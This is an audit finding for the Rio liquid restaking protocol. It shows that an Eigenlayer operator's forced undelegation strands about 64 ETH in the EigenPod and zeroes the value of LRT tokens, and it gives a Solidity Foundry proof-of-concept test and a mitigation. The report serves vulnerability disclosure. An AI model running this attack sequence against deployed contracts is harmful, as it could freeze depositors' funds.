high

## Operators can undelegate LRTRioOperatorDelegator instances from Eigenlayer, leading to loss of funds
## Summary
Eigenlayer allows an operator to remove a staker delegation to himself via DelegationManager::undelegate(), this is not taken in consideration by the protocol and will create inconsistencies when tracking balances.

## Vulnerability Detail
An operator can call DelegationManager::undelegate() by passing as input the address of the LRTRioOperatorDelegator that delegated his stake him. The function will:

Instantly reduce the number of Eigenlayer strategies shares owned by the LRTRioOperatorDelegator instance.
Queue a withdrawal of the undelegated funds with the withdrawer parameter set to the LRTRioOperatorDelegator instance.
The reduction of shares will cause an instant drop in value of all the LRTTokens because the Rio protocol is not aware that the funds are queued for withdrawal.

The funds queued for withdrawal are stuck in limbo because to be withdrawn the function DelegationManager::completeQueuedWithdrawal() needs to be called by the LRTRioOperatorDelegator instance, which doesn't have this functionality.

### POC
In RioLRTCoordinator.t.sol import:
```solidity
import {IRioLRTOperatorDelegator} from 'contracts/interfaces/IRioLRTOperatorDelegator.sol';
import {IRioLRTOperatorRegistry} from 'contracts/interfaces/IRioLRTOperatorRegistry.sol'; then copy-paste:
function test_undelegateOnEigenlayer() public {
    uint8 operatorId = addOperatorDelegators(reETH.operatorRegistry, address(reETH.rewardDistributor), 1)[0];
    address operatorDelegator = reETH.operatorRegistry.getOperatorDetails(operatorId).delegator;
    address operatorAddress = address(uint160(1));

    //-> Deposit ETH so there's 64ETH in the deposit pool
    uint256 depositAmount = 2*ETH_DEPOSIT_SIZE - address(reETH.depositPool).balance;
    reETH.coordinator.depositETH{value: depositAmount}();

    //-> Stake the 64ETH on the validators
    vm.prank(EOA, EOA);
    reETH.coordinator.rebalance(ETH_ADDRESS);

    //-> Verify validators credentials
    uint40[] memory validatorIndices = verifyCredentialsForValidators(reETH.operatorRegistry, 1, 2);

    //-> Cache current TVL and ETH Balance
    uint256 TVLBefore = reETH.coordinator.getTVL();
    uint256 ETHBalanceBefore = reETH.assetRegistry.getTotalBalanceForAsset(ETH_ADDRESS);

    //-> TVL and ETH balance is both 64ETH (only beacon strategy is present)
    assertEq(ETHBalanceBefore, 64 ether);
    assertEq(TVLBefore, 64 ether);

    //->Operator calls `undelegate()` on Eigenlayer
    IRioLRTOperatorRegistry.OperatorPublicDetails memory details = reETH.operatorRegistry.getOperatorDetails(operatorId);
    vm.prank(operatorAddress);
    delegationManager.undelegate(details.delegator);

    //-> Process withdrawal of ETH from the validators
    verifyAndProcessWithdrawalsForValidatorIndexes(operatorDelegator, validatorIndices);

    //-> Cache current TVL and ETH Balance
    uint256 TVLAfter = reETH.coordinator.getTVL();
    uint256 ETHBalanceAfter = reETH.assetRegistry.getTotalBalanceForAsset(ETH_ADDRESS);
    
    //-> TVL and ETH balance is both 0ETH
    //-> The ~64ETH initially deposited are stuck in limbo and the LRTTokens are worth 0
    uint256 LRTTokensValue = reETH.coordinator.convertToUnitOfAccountFromRestakingTokens(reETH.token.balanceOf(address(this)));
    uint256 eigenPodBalance = address(IRioLRTOperatorDelegator(operatorDelegator).eigenPod()).balance;
    assertEq(TVLAfter, 0);
    assertEq(ETHBalanceAfter, 0);
    assertEq(eigenPodBalance, 64 ether);
    assertEq(LRTTokensValue, 0);
}
```
## Impact
LRTTokens will instantly lose value and funds will be stuck in the Eigenpod.

## Code Snippet
## Tool used
Manual Review

## Recommendation
Add functionality to the LRTRioOperatorDelegator contract to recover forced undelegations funds. When undelegate() is called the protocol assumes it has fewer assets than it does, it's important to not allow users to request withdrawals, deposit or rebalance during this timeframe. It's possible to achieve this by tracking the cumulativeWithdrawalsQueued variable of the Eigenlayer DelegationManager and make sure it's consistent with the expected state when calling deposit(), requestWithdrawal() or reabalance().
